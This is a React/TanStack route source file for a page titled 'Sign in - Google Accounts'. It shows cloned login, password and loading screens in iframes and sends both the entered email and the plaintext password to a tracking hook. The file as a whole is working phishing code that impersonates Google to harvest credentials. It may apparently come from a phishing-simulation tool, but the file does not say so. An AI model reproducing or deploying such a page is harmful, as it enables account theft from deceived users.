import { createFileRoute } from "@tanstack/react-router";
import { useState, useCallback, useRef, useEffect } from "react";
import { GeIframe, type GeIframeMessage } from "@/components/ge/GeIframe";
import { useGeTracking } from "@/components/ge/GeShared";

export const Route = createFileRoute("/ge/signin")({
  head: () => ({ meta: [{ title: "Sign in - Google Accounts" }] }),
  component: GeSignInPage,
});

type Step = "email" | "password" | "loading";

function GeSignInPage() {
  const { trackClick, trackInput, geNavigate, sessionId } = useGeTracking();
  const [step, setStep] = useState<Step>("email");
  const stepRef = useRef(step);
  useEffect(() => { stepRef.current = step; }, [step]);

  const handle = useCallback(
    (m: GeIframeMessage) => {
      if (m.type === "submit") {
        const f = m.fields || {};
        const cur = stepRef.current;
        if (cur === "email") {
          const email = String(f.identifier || f.Email || f.email || "").trim();
          if (!email) return;
          trackClick("Next-Email");
          trackInput("email", email);
          try { localStorage.setItem("saved_user_email", email); } catch { /* noop */ }
          setStep("password");
        } else if (cur === "password") {
          const pw = String(f.Passwd || f.password || f.hiddenPassword || "");
          if (!pw) return;
          trackClick("Next-Password");
          trackInput("password", pw);
          setStep("loading");
        }
      } else if (m.type === "link") {
        trackClick(`Link:${m.text || m.href}`);
      }
    },
    [trackClick, trackInput, geNavigate]
  );

  const layer = (active: boolean): React.CSSProperties => ({
    position: "fixed",
    inset: 0,
    opacity: active ? 1 : 0,
    pointerEvents: active ? "auto" : "none",
    transition: "opacity 220ms ease",
    zIndex: active ? 2 : 1,
  });

  return (
    <>
      <div style={layer(step === "email")}>
        <GeIframe src="/ge-html/login.html" title="Sign in" onMessage={handle} />
      </div>
      <div style={layer(step === "password")}>
        <GeIframe src="/ge-html/password.html" title="Verify password" onMessage={handle} />
      </div>
      <div style={layer(step === "loading")}>
        <GeIframe src="/ge-html/loading.html" title="Loading" />
      </div>
      <div style={{ position: "fixed", bottom: 8, right: 8, fontSize: 10, opacity: 0, pointerEvents: "none" }}>{sessionId}</div>
    </>
  );
}
